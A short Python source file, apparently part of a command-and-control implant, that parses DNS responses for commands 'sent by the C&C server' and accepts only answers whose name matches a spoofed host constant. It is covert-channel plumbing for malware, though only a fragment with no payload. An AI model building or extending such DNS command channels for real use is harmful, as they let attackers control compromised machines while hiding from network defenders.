from utils.consts import CC_SERVER_SPOOFED_HOST, PACKET_OPTIONS

class CommandParser:
    """ A class to help parse DNS responses for commands. """
    def __init__(self):
        pass

    def parse(self, response):
        """ Extract the command from a DNS response sent by the C&C server. """ 
        if not response.haslayer('DNS'):
            return None

        an = response['DNS'].an
        if an == None:
            return None
            
        if an.type != PACKET_OPTIONS['DNS']['AN']['TYPE']:
            return None

        if an.qname != CC_SERVER_SPOOFED_HOST:
            return None
        
        return an.rdata